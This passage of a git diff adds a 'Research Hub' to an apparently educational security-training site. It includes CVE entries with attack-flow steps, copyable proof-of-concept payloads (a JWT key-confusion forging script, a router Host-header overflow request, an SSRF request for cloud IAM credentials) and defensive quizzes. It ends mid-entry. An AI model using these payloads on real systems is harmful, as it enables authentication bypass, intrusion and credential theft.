@@ -39,6 +39,353 @@
       0%, 100% { top: 0px; }
       50% { top: -6px; }
     }
+
+    /* Security Research Hub Styles */
+    .research-hub-container {
+      display: flex;
+      gap: 20px;
+      height: calc(100vh - 220px);
+      min-height: 550px;
+      margin-top: 15px;
+    }
+    .research-sidebar {
+      width: 280px;
+      background: rgba(10, 10, 20, 0.6);
+      border: 1px solid rgba(0, 229, 255, 0.15);
+      border-radius: 8px;
+      padding: 15px;
+      overflow-y: auto;
+      backdrop-filter: blur(8px);
+    }
+    .research-menu-section {
+      margin-bottom: 20px;
+    }
+    .research-menu-header {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.85rem;
+      font-weight: 800;
+      color: var(--accent-cyan, #00e5ff);
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      border-bottom: 1px solid rgba(0, 229, 255, 0.1);
+      padding-bottom: 4px;
+    }
+    .research-menu-items {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+    .research-item {
+      background: transparent;
+      border: none;
+      text-align: left;
+      padding: 8px 12px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.7);
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .research-item:hover {
+      background: rgba(0, 229, 255, 0.08);
+      color: #fff;
+      padding-left: 16px;
+    }
+    .research-item.active {
+      background: rgba(0, 229, 255, 0.15);
+      border-left: 3px solid var(--accent-cyan, #00e5ff);
+      color: #fff;
+      font-weight: bold;
+    }
+    .research-canvas {
+      flex: 1;
+      background: rgba(10, 10, 20, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 8px;
+      padding: 25px;
+      overflow-y: auto;
+      backdrop-filter: blur(8px);
+      position: relative;
+    }
+
+    /* CVE Details & Tabs Styling */
+    .cve-view-header {
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding-bottom: 15px;
+      margin-bottom: 20px;
+    }
+    .cve-view-meta {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .cve-id-badge {
+      background: rgba(0, 229, 255, 0.1);
+      border: 1px solid rgba(0, 229, 255, 0.3);
+      color: var(--accent-cyan, #00e5ff);
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      font-weight: bold;
+      padding: 3px 8px;
+      border-radius: 4px;
+    }
+    .cve-severity-badge {
+      font-family: 'Inter', sans-serif;
+      font-size: 0.8rem;
+      font-weight: bold;
+      padding: 3px 8px;
+      border-radius: 4px;
+    }
+    .cve-severity-badge.critical {
+      background: rgba(255, 85, 85, 0.15);
+      border: 1px solid #ff5555;
+      color: #ff5555;
+    }
+    .cve-severity-badge.high {
+      background: rgba(255, 153, 0, 0.15);
+      border: 1px solid #ff9900;
+      color: #ff9900;
+    }
+    .cve-severity-badge.medium {
+      background: rgba(255, 213, 0, 0.15);
+      border: 1px solid #ffd500;
+      color: #ffd500;
+    }
+    .cve-view-title {
+      font-family: 'Inter', sans-serif;
+      font-size: 1.6rem;
+      font-weight: bold;
+      color: #fff;
+      margin: 0;
+    }
+    .cve-tabs {
+      display: flex;
+      gap: 8px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding-bottom: 1px;
+      margin-bottom: 25px;
+      overflow-x: auto;
+    }
+    .cve-tab {
+      background: transparent;
+      border: none;
+      color: rgba(255, 255, 255, 0.6);
+      font-family: 'Inter', sans-serif;
+      font-size: 0.9rem;
+      padding: 10px 16px;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: all 0.2s ease;
+      white-space: nowrap;
+    }
+    .cve-tab:hover {
+      color: #fff;
+    }
+    .cve-tab.active {
+      color: var(--accent-cyan, #00e5ff);
+      border-bottom: 2px solid var(--accent-cyan, #00e5ff);
+      font-weight: bold;
+    }
+    
+    /* Attack Flow Steps */
+    .attack-flow-visual {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 8px;
+      padding: 20px;
+    }
+    .flow-step {
+      display: flex;
+      gap: 15px;
+      width: 100%;
+      align-items: flex-start;
+    }
+    .flow-step-number {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: rgba(0, 229, 255, 0.15);
+      border: 1px solid var(--accent-cyan, #00e5ff);
+      color: var(--accent-cyan, #00e5ff);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Fira Code', monospace;
+      font-weight: bold;
+      font-size: 0.9rem;
+      flex-shrink: 0;
+    }
+    .flow-step-body h4 {
+      color: #fff;
+      margin: 0 0 5px 0;
+      font-size: 0.95rem;
+    }
+    .flow-step-body p {
+      color: rgba(255, 255, 255, 0.7);
+      margin: 0;
+      font-size: 0.85rem;
+      line-height: 1.4;
+    }
+    .flow-arrow {
+      color: rgba(0, 229, 255, 0.4);
+      font-size: 1.5rem;
+      margin: 10px 0;
+      font-family: 'Fira Code', monospace;
+    }
+    
+    /* Copy code button & CVSS Open button */
+    .btn-copy-code {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      color: #fff;
+      font-size: 0.75rem;
+      padding: 4px 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.2s ease;
+    }
+    .btn-copy-code:hover {
+      background: rgba(255, 255, 255, 0.15);
+    }
+    .btn-calculator-open {
+      background: var(--accent-cyan, #00e5ff);
+      border: none;
+      color: #000;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.85rem;
+      font-weight: bold;
+      padding: 8px 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .btn-calculator-open:hover {
+      background: #00b8cc;
+      box-shadow: 0 0 10px rgba(0, 229, 255, 0.4);
+    }
+    
+    /* Quiz Options */
+    .quiz-opt-btn {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: rgba(255, 255, 255, 0.9);
+      padding: 12px 16px;
+      border-radius: 6px;
+      text-align: left;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.9rem;
+      transition: all 0.2s ease;
+      width: 100%;
+    }
+    .quiz-opt-btn:hover {
+      background: rgba(255, 255, 255, 0.08);
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+
+    /* CVSS Calculator Styling */
+    .calc-metric-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      gap: 15px;
+    }
+    .calc-metric-label {
+      display: flex;
+      flex-direction: column;
+      max-width: 50%;
+    }
+    .calc-metric-label strong {
+      color: #fff;
+      font-size: 0.9rem;
+    }
+    .calc-metric-label span {
+      color: rgba(255, 255, 255, 0.5);
+      font-size: 0.75rem;
+      margin-top: 3px;
+      line-height: 1.3;
+    }
+    .calc-btn-group {
+      display: flex;
+      gap: 5px;
+    }
+    .calc-btn {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      color: rgba(255, 255, 255, 0.7);
+      padding: 6px 12px;
+      border-radius: 4px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.8rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .calc-btn:hover {
+      background: rgba(255, 255, 255, 0.08);
+      color: #fff;
+    }
+    .calc-btn.active {
+      background: rgba(0, 229, 255, 0.15);
+      border-color: var(--accent-cyan, #00e5ff);
+      color: var(--accent-cyan, #00e5ff);
+      font-weight: bold;
+    }
+    .calc-score-display.critical { border-color: #ff5555; color: #ff5555; box-shadow: 0 0 15px rgba(255, 85, 85, 0.2); }
+    .calc-score-display.high { border-color: #ff9900; color: #ff9900; box-shadow: 0 0 15px rgba(255, 153, 0, 0.2); }
+    .calc-score-display.medium { border-color: #ffd500; color: #ffd500; box-shadow: 0 0 15px rgba(255, 213, 0, 0.2); }
+    .calc-score-display.low { border-color: #50fa7b; color: #50fa7b; box-shadow: 0 0 15px rgba(80, 250, 123, 0.2); }
+    .calc-score-display.none { border-color: rgba(255,255,255,0.2); color: rgba(255,255,255,0.5); }
+    
+    .text-critical { color: #ff5555; }
+    .text-high { color: #ff9900; }
+    .text-medium { color: #ffd500; }
+    .text-low { color: #50fa7b; }
+    .text-none { color: rgba(255, 255, 255, 0.5); }
+
+    @media (max-width: 900px) {
+      .research-hub-container {
+        flex-direction: column;
+        height: auto;
+      }
+      .research-sidebar {
+        width: 100%;
+        height: auto;
+        max-height: 280px;
+      }
+      .calc-grid {
+        grid-template-columns: 1fr !important;
+      }
+      .calc-metric-row {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .calc-metric-label {
+        max-width: 100%;
+      }
+      .calc-btn-group {
+        flex-wrap: wrap;
+        width: 100%;
+        margin-top: 5px;
+      }
+      .calc-btn {
+        flex: 1 1 40%;
+      }
+    }
   </style>
 </head>
 <body>
@@ -263,8 +610,8 @@
         <button class="tab-link" onclick="switchTab('articles')" data-tab="articles">
           <span class="tab-icon">📚</span> Articles
         </button>
-        <button class="tab-link" onclick="switchTab('writeups')" data-tab="writeups">
-          <span class="tab-icon">📝</span> Writeups
+        <button class="tab-link" onclick="switchTab('research')" data-tab="research">
+          <span class="tab-icon">🔬</span> Research Hub
         </button>
         <button class="tab-link" onclick="switchTab('books')" data-tab="books">
           <span class="tab-icon">📖</span> Books
@@ -498,88 +845,48 @@
 
         </div>
 
-<div class="workspace-pane" id="pane-writeups">
-          <h2 class="pane-view-title">// Security Knowledge Base & CTF Writeups</h2>
-          <div class="visual-writeups-grid">
+<div class="workspace-pane" id="pane-research">
+          <h2 class="pane-view-title">// Security Research Hub</h2>
+          <div class="research-hub-container">
+            <!-- Left Navigation Directory (Tree Menu) -->
+            <div class="research-sidebar">
+              <div class="research-menu-section">
+                <div class="research-menu-header">🎓 CVE Academy</div>
+                <div class="research-menu-items">
+                  <button class="research-item active" onclick="loadResearch('cve', 'CVE-2025-1024')">CVE-2025-1024 (JWT Auth)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-2048')">CVE-2025-2048 (TP-Link RCE)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-4096')">CVE-2025-4096 (SSRF Meta)</button>
+                </div>
+              </div>
+              <div class="research-menu-section">
+                <div class="research-menu-header">📶 Router Research</div>
+                <div class="research-menu-items">
+                  <button class="research-item" onclick="loadResearch('router', 'deco-m5')">TP-Link Deco M5 Analysis</button>
+                </div>
+              </div>
+              <div class="research-menu-section">
+                <div class="research-menu-header">🔍 Interactive Tools</div>
+                <div class="research-menu-items">
+                  <button class="research-item" onclick="loadResearch('tools', 'cvss-calc')">CVSS v3.1 Calculator</button>
+                  <button class="research-item" onclick="loadResearch('tools', 'timeline')">Vulnerability Timeline</button>
+                </div>
+              </div>
+              <div class="research-menu-section">
+                <div class="research-menu-header">📝 Exploit Walkthroughs</div>
+                <div class="research-menu-items">
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'nmap-notes')">Nmap Scan Deep Dive</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'xss-basics')">Cross-Site Scripting (XSS)</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'linux-privesc')">Linux Privilege Escalation</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'burp-suite')">Burp Suite Pro Tips</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'feroxbuster')">Feroxbuster Discovery</button>
+                </div>
+              </div>
+            </div>
 
-            <a href="bug-bounty-writeups.html" class="visual-writeup-card" style="text-decoration:none;color:inherit;border-color:rgba(0,229,255,0.25);">
-              <div class="writeup-card-header">
-                <span class="writeup-card-date">Pentester.land</span>
-                <span class="writeup-read">10 writeups</span>
-              </div>
-              <h3 class="writeup-card-title">🎯 أحدث Bug Bounty Writeups</h3>
-              <p class="writeup-card-desc">تحليل عربي لأحدث 10 writeups — Critical إلى High مع payloads ودروس مستفادة. / Arabic analysis with copy-ready payloads.</p>
-              <div class="writeup-card-link">
-                <span>فتح الصفحة / Open Page</span>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
-              </div>
-            </a>
-            
-            <div class="visual-writeup-card" onclick="openWriteupModal('nmap-notes')">
-              <div class="writeup-card-header">
-                <span class="writeup-card-date">May 15, 2026</span>
-                <span class="writeup-read">5 min read</span>
-              </div>
-              <h3 class="writeup-card-title">Deep Dive into Nmap Scanning</h3>
-              <p class="writeup-card-desc">Understanding Nmap scan types (SYN, Connect, UDP), evasion techniques, NSE scripts, and analyzing packet captures.</p>
-              <div class="writeup-card-link">
-                <span>View Full Writeup Log</span>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
-              </div>
+            <!-- Right Display Canvas -->
+            <div class="research-canvas" id="researchCanvas">
+              <!-- Content loaded dynamically here via JS -->
             </div>
-            
-            <div class="visual-writeup-card" onclick="openWriteupModal('xss-basics')">
-              <div class="writeup-card-header">
-                <span class="writeup-card-date">May 10, 2026</span>
-                <span class="writeup-read">5 min read</span>
-              </div>
-              <h3 class="writeup-card-title">Cross-Site Scripting (XSS) Walkthrough</h3>
-              <p class="writeup-card-desc">Explaining the differences between Stored, Reflected, and DOM-based XSS, cookie hijacking payloads, and mitigation.</p>
-              <div class="writeup-card-link">
-                <span>View Full Writeup Log</span>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
-              </div>
-            </div>
-            
-            <div class="visual-writeup-card" onclick="openWriteupModal('linux-privesc')">
-              <div class="writeup-card-header">
-                <span class="writeup-card-date">May 05, 2026</span>
-                <span class="writeup-read">5 min read</span>
-              </div>
-              <h3 class="writeup-card-title">Linux Privilege Escalation Techniques</h3>
-              <p class="writeup-card-desc">A cheat sheet for escalating privileges on Linux systems using misconfigured SUID binaries, cron jobs, and sudo rights.</p>
-              <div class="writeup-card-link">
-                <span>View Full Writeup Log</span>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
-              </div>
-            </div>
-            
-            <div class="visual-writeup-card" onclick="openWriteupModal('burp-suite')">
-              <div class="writeup-card-header">
-                <span class="writeup-card-date">April 28, 2026</span>
-                <span class="writeup-read">5 min read</span>
-              </div>
-              <h3 class="writeup-card-title">Burp Suite Pro Tips for Web Audits</h3>
-              <p class="writeup-card-desc">Unlocking the power of Burp Suite Proxy, Intruder, Repeater, and customized extensions for effective penetration testing.</p>
-              <div class="writeup-card-link">
-                <span>View Full Writeup Log</span>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
-              </div>
-            </div>
-            
-            <div class="visual-writeup-card" onclick="openWriteupModal('feroxbuster')">
-              <div class="writeup-card-header">
-                <span class="writeup-card-date">April 20, 2026</span>
-                <span class="writeup-read">5 min read</span>
-              </div>
-              <h3 class="writeup-card-title">Fast Directory Discovery with Feroxbuster</h3>
-              <p class="writeup-card-desc">A guide to directory busting using Feroxbuster: configuring filters, parallel recursive scans, and custom headers.</p>
-              <div class="writeup-card-link">
-                <span>View Full Writeup Log</span>
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
-              </div>
-            </div>
-            
           </div>
         </div>
 
@@ -19185,18 +19492,21 @@ Authorization: Basic <span id="burp-payload-marker" style="background:rgba(0,255
     function printCertsLog() {
       let log = '<strong>Accreditations & Professional Ranks:</strong><br><br>';
       
-        log += `[+] <span class="text-neon-green">OSCP (Offensive Security Certified Professional)</span> (${cert.issuer})<br>` +
-               `Status: ${cert.status} | Date: ${cert.date}<br><br>`;
+        log += `[+] <span class="text-neon-green">OSCP (Offensive Security Certified Professional)</span> (Offensive Security)<br>` +
+               `Status: In Progress | Date: 2026<br><br>`;
+
       
-        log += `[+] <span class="text-neon-green">RHCSA (Red Hat Certified System Administrator)</span> (${cert.issuer})<br>` +
-               `Status: ${cert.status} | Date: ${cert.date}<br><br>`;
+        log += `[+] <span class="text-neon-green">RHCSA (Red Hat Certified System Administrator)</span> (Red Hat)<br>` +
+               `Status: In Progress | Date: 2026<br><br>`;
+
       
-        log += `[+] <span class="text-neon-green">TryHackMe (Top 1%)</span> (${cert.issuer})<br>` +
-               `Status: ${cert.status} | Date: ${cert.date}<br><br>`;
+        log += `[+] <span class="text-neon-green">TryHackMe (Top 1%)</span> (TryHackMe Platform)<br>` +
+               `Status: Active | Date: 2026<br><br>`;
+
       
-        log += `[+] <span class="text-neon-green">HackTheBox Pro Hacker</span> (${cert.issuer})<br>` +
-               `Status: ${cert.status} | Date: ${cert.date}<br><br>`;
-      
+        log += `[+] <span class="text-neon-green">HackTheBox Pro Hacker</span> (HackTheBox Platform)<br>` +
+               `Status: Active | Date: 2026<br><br>`;
+
       printLineToTerminal(log);
     }
 
@@ -20755,7 +21065,10 @@ Authorization: Basic <span id="burp-payload-marker" style="background:rgba(0,255
     }
 
     // Calculate dynamic completion progress
+    let _dashDebounceTimer = null;
     function updateDashboardProgress() {
+      if (_dashDebounceTimer) return;
+      _dashDebounceTimer = setTimeout(() => { _dashDebounceTimer = null; }, 200);
       // 1. Visited methodology count
       const visited = JSON.parse(localStorage.getItem('meth_visited') || '[]');
       const totalPhases = 26;
@@ -20778,19 +21091,12 @@ Authorization: Basic <span id="burp-payload-marker" style="background:rgba(0,255
       let totalBookSections = 0;
       let completedBookSections = 0;
       let completedBooksCount = 0;
+      const allLsKeys = Object.keys(localStorage);
       for (const [bookId, total] of Object.entries(bookSections)) {
         totalBookSections += total;
-        let read = 0;
-        for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          if (key.startsWith(`read_${bookId}_`) && localStorage.getItem(key) === 'true') {
-            read++;
-          }
-        }
+        const read = allLsKeys.filter(k => k.startsWith(`read_${bookId}_`) && localStorage.getItem(k) === 'true').length;
         completedBookSections += read;
-        if (read === total) {
-          completedBooksCount++;
-        }
+        if (read === total) completedBooksCount++;
       }
 
       // 3. Labs progress (10 labs)
@@ -20831,15 +21137,8 @@ Authorization: Basic <span id="burp-payload-marker" style="background:rgba(0,255
 
       // Set last active mission text
       if (nextChEl) {
-        let lastReadBook = 'لم يبدأ بعد';
-        for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          if (key.startsWith('last_read_title_')) {
-            const title = localStorage.getItem(key);
-            lastReadBook = title;
-          }
-        }
-        nextChEl.textContent = lastReadBook;
+        const lastReadKey = Object.keys(localStorage).find(k => k.startsWith('last_read_title_'));
+        nextChEl.textContent = lastReadKey ? localStorage.getItem(lastReadKey) : 'لم يبدأ بعد';
       }
     }
 
@@ -21515,7 +21814,872 @@ function exitSimulator() {
     }
     window.syncProgressWithDatabase = syncProgressWithDatabase;
 
+    // ─────────────────────────────────────────────────────────
+    // SECURITY RESEARCH HUB ENGINE
+    // ─────────────────────────────────────────────────────────
+    const researchData = {
+      cve: {
+        'CVE-2025-1024': {
+          title: "JWT Authentication Bypass",
+          severity: "CRITICAL",
+          score: "9.8",
+          vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          tabs: {
+            details: `
+              <h3>Description</h3>
+              <p>A critical vulnerability in JWT signature verification allows remote attackers to bypass authentication by exploiting a key confusion vulnerability. The application fails to validate the algorithm header (HMAC vs RSA), allowing attackers to sign tokens with the server's public key using HS256.</p>
+              <div style="margin-top: 15px;">
+                <strong>Impact:</strong> Complete authentication bypass and administrative privilege escalation.
+              </div>
+            `,
+            flow: `
+              <h3>Attack Flow Visualizer</h3>
+              <div class="attack-flow-visual">
+                <div class="flow-step">
+                  <div class="flow-step-number">1</div>
+                  <div class="flow-step-body">
+                    <h4>Reconnaissance</h4>
+                    <p>Attacker retrieves the server's public key (often exposed via /.well-known/jwks.json or certificate metadata).</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">2</div>
+                  <div class="flow-step-body">
+                    <h4>Token Forgery</h4>
+                    <p>Attacker crafts a JWT header setting "alg": "HS256" and payload "user": "admin", then signs the token using the server's RSA public key as the HMAC shared secret.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">3</div>
+                  <div class="flow-step-body">
+                    <h4>Bypass Execution</h4>
+                    <p>Attacker submits the forged JWT. The server verifies it with HMAC using its public key, matching the forged signature and granting full admin access.</p>
+                  </div>
+                </div>
+              </div>
+            `,
+            poc: `
+              <h3>Proof of Concept (Python)</h3>
+              <div style="position: relative;">
+                <button class="btn-copy-code" onclick="copyResearchCode('poc_jwt_code')">Copy</button>
+                <pre id="poc_jwt_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;">import jwt
+import requests
+
+# Public key obtained from server
+public_key = open("public.pem").read()
+
+# Forge JWT with HS256 algorithm using public key as secret
+forged_token = jwt.encode(
+    {"user": "admin", "role": "administrator"},
+    key=public_key,
+    algorithm="HS256"
+)
+
+# Send request with forged token
+headers = {"Authorization": f"Bearer {forged_token}"}
+r = requests.get("http://target.com/api/admin/dashboard", headers=headers)
+print(r.text)</pre>
+              </div>
+            `,
+            quiz: `
+              <h3>Knowledge Assessment</h3>
+              <p>How does a developer prevent the Key Confusion vulnerability in JWT libraries?</p>
+              <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) Disable signature verification for public routes</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) Explicitly specify allowed algorithms when decoding (e.g., ['RS256'])</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) Use longer RSA keys (4096-bit)</button>
+              </div>
+              <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+            `
+          }
+        },
+        'CVE-2025-2048': {
+          title: "TP-Link WAN Remote Code Execution",
+          severity: "CRITICAL",
+          score: "9.8",
+          vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+          tabs: {
+            details: `
+              <h3>Description</h3>
+              <p>A buffer overflow vulnerability in the WAN-facing web interface of multiple TP-Link router firmware versions allows remote unauthenticated attackers to execute arbitrary commands by sending specially crafted HTTP headers during DHCP negotiation or setup.</p>
+              <div style="margin-top: 15px;">
+                <strong>Impact:</strong> Full remote system compromise (root shell access) on WAN interface.
+              </div>
+            `,
+            flow: `
+              <h3>Attack Flow Visualizer</h3>
+              <div class="attack-flow-visual">
+                <div class="flow-step">
+                  <div class="flow-step-number">1</div>
+                  <div class="flow-step-body">
+                    <h4>Header Injection</h4>
+                    <p>Attacker sends a large HTTP Host header exceeding 1024 bytes containing shellcode and a return address overwrite.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">2</div>
+                  <div class="flow-step-body">
+                    <h4>Stack Buffer Overflow</h4>
+                    <p>The parser copies the Host header using standard strcpy without boundary checks, overwriting the return address on the stack.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">3</div>
+                  <div class="flow-step-body">
+                    <h4>Execution Hijack</h4>
+                    <p>When the parsing function returns, it jumps to the attacker's shellcode in memory, spawning a root shell pointing back to the attacker.</p>
+                  </div>
+                </div>
+              </div>
+            `,
+            poc: `
+              <h3>Proof of Concept (Raw Payload)</h3>
+              <div style="position: relative;">
+                <button class="btn-copy-code" onclick="copyResearchCode('poc_tplink_code')">Copy</button>
+                <pre id="poc_tplink_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ff5555;">GET / HTTP/1.1
+Host: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\\x41\\x41\\x41\\x41\\x60\\xf1\\xff\\xbf[shellcode_here]
+User-Agent: Mozilla/5.0
+Accept: */*</pre>
+              </div>
+            `,
+            quiz: `
+              <h3>Knowledge Assessment</h3>
+              <p>Which function is safer to use in C/C++ to prevent buffer overflows?</p>
+              <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) strcpy()</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) strncpy() / strlcpy()</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) strcat()</button>
+              </div>
+              <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+            `
+          }
+        },
+        'CVE-2025-4096': {
+          title: "SSRF in Kubernetes Metadata API",
+          severity: "HIGH",
+          score: "8.6",
+          vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+          tabs: {
+            details: `
+              <h3>Description</h3>
+              <p>An Server-Side Request Forgery (SSRF) vulnerability allows authenticated users to make the server send HTTP requests to internal metadata endpoints (e.g., http://169.254.169.254) using a PDF generation feature that accepts user-supplied external resource links.</p>
+              <div style="margin-top: 15px;">
+                <strong>Impact:</strong> Leakage of cloud provider IAM tokens and service account secrets.
+              </div>
+            `,
+            flow: `
+              <h3>Attack Flow Visualizer</h3>
+              <div class="attack-flow-visual">
+                <div class="flow-step">
+                  <div class="flow-step-number">1</div>
+                  <div class="flow-step-body">
+                    <h4>Target Request</h4>
+                    <p>Attacker submits a request to generate a PDF, passing <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> as an image source link.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">2</div>
+                  <div class="flow-step-body">
+                    <h4>Internal Fetch</h4>
+                    <p>The backend server processes the PDF generation, trusts the URL, and fetches the AWS metadata endpoint from its internal interface.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">3</div>
+                  <div class="flow-step-body">
+                    <h4>IAM Token Leakage</h4>
+                    <p>The server embeds the AWS IAM credentials response within the PDF binary, which the attacker downloads and extracts to gain AWS access.</p>
+                  </div>
+                </div>
+              </div>
+            `,
+            poc: `
+              <h3>Proof of Concept (HTTP Request)</h3>
+              <div style="position: relative;">
+                <button class="btn-copy-code" onclick="copyResearchCode('poc_ssrf_code')">Copy</button>
+                <pre id="poc_ssrf_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffb86c;">POST /api/v1/generate-report HTTP/1.1
+Host: cloud-app.com
+Content-Type: application/json
+
+{
+  "title": "Quarterly Report",
+  "logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role"
+}</pre>
+              </div>
+            `,
+            quiz: `
+              <h3>Knowledge Assessment</h3>
+              <p>Which method is the most secure defense against SSRF?</p>
+              <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) Blacklisting "169.254.169.254" in URL validation</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) Enforcing a strict whitelist of allowed domains and using isolated network zones</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) Using HTTP POST instead of GET for external requests</button>
+              </div>
+              <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+            `
+          }
+        }
+      },
+      router: {
+        'deco-m5': {
+          title: "TP-Link Deco M5 Architecture Analysis",
+          tabs: {
+            details: `
+              <h3>Deco M5 Hardware & Architecture</h3>
+              <p>The Deco M5 router features a Qualcomm IPQ4019 SoC, running an embedded Linux kernel version 3.18.44. The system relies on a SquashFS read-only root filesystem with a dynamic JFFS2 partition for system configuration and user settings.</p>
+              <div style="margin-top: 15px;">
+                <strong>Services Analyzed:</strong>
+                <ul>
+                  <li><strong>uhttpd:</strong> Lightweight HTTP server handling the web admin panel.</li>
+                  <li><strong>tdpd:</strong> TP-Link Device Protocol daemon, responsible for inter-device LAN communication.</li>
+                  <li><strong>dhcpd:</strong> DNSMasq configuration providing local network address allocation.</li>
+                </ul>
+              </div>
+            `,
+            flow: `
+              <h3>Vulnerability Research Mapping</h3>
+              <div class="attack-flow-visual">
+                <div class="flow-step">
+                  <div class="flow-step-number">1</div>
+                  <div class="flow-step-body">
+                    <h4>Firmware Extraction</h4>
